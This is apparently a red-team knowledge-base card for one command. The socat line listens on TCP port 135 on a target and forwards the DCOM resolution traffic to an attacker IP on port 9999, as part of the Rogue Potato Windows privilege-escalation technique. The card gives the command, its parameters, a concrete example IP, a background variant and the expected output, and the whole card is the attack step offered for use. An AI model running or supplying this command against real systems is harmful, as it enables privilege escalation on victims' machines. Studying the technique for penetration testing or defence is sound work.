---
id: new-uuid-1
name: socat-tcp-135-to-9999-forward
type: command
executor: bash
data: 'socat tcp-listen:135,reuseaddr,fork tcp:$_ATTACKER_IP:9999'
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - Linux
tags:
  - port-forward
  - dcom-redirect
verified: true
validated: true
---

# socat-tcp-135-to-9999-forward

## Command

```bash
socat tcp-listen:135,reuseaddr,fork tcp:$_ATTACKER_IP:9999
```

## Description

This command sets up a TCP port forwarder using socat to listen on port 135 (DCOM RPC Endpoint Mapper) and redirect all incoming connections to the specified attacker IP on port 9999. It is used on the remote target to enable interception of DCOM resolution requests for privilege escalation techniques like Rogue Potato.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| tcp-listen:135 | Listen on TCP port 135 | Yes |
| reuseaddr | Allow reuse of the address if in use | Yes |
| fork | Fork new process for each connection | Yes |
| tcp:$_ATTACKER_IP:9999 | Forward to attacker's IP and port 9999 | Yes |

## Examples

### Basic Usage

```bash
socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.100:9999
```

### Advanced Usage

Run in background: socat tcp-listen:135,reuseaddr,fork tcp:$_ATTACKER_IP:9999 &

## Expected Output

socat will output connection logs like '2023/10/01 12:00:00 socat[1234] N incoming connection from [target_ip]:[port]' upon successful forwarding. No errors indicate the listener is active; test by connecting to port 135 from another host.

## Related

- [[procedures/Rogue-Potato-Impersonation-Privileges]]
- [[commands/roguepotato-remote-execution-with-local-resolver-9999]]
